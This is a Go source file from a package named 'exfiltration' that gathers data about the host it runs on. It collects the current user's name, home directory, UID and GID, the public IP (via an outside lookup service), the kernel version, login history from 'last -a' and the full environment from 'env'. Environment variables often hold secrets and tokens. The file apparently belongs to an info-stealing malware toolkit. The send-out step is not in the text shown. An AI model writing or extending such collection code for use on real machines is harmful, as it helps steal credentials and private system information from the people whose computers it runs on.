package exfiltration

import (
	"bytes"
	"io/ioutil"
	"net/http"
	"os/user"
	"os/exec"
)


func GetPublicIP() (string) {
	url := "https://api.ipify.org?format=text"
	resp, err := http.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	ip, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return string(ip)
}


func getInfoS() ([]byte,string){
	currentUser, err := user.Current()
	var bufData bytes.Buffer
	if err != nil {
		return bufData.Bytes(), ""
	}

	data := []string{
		"🆔 Current User: " + currentUser.Username,
		"📂 Home: " + currentUser.HomeDir,
		"🔑 UID: " + currentUser.Uid,
		"🔑 GID: " + currentUser.Gid, 
		"🌐 IP: " + GetPublicIP(),
		"⚙️ Kernel: " + getKernel(),
	}

	for _, line := range data {
			bufData.WriteString(line + "\n")
	}
	return bufData.Bytes(), currentUser.HomeDir
}


func getKernel() string{
	cmd := exec.Command("uname", "-a")
	output, err := cmd.CombinedOutput()
	if err != nil {
        return ""
    }
	return string(output)

}

func getLastUser() []byte{
	cmd := exec.Command("last", "-a")
	output, err := cmd.CombinedOutput()
	if err != nil {
        return make([]byte, 0)
    }
	return output
}

func getEnv() []byte{
	cmd := exec.Command("env")
	output, err := cmd.CombinedOutput()
	if err != nil {
        return make([]byte, 0)
    }
	return output
}

func GetInfo() ([]byte, string, []byte, []byte) {
	data, home := getInfoS()
	env := getEnv()
	hist := getLastUser()
	return data, home, env, hist

}

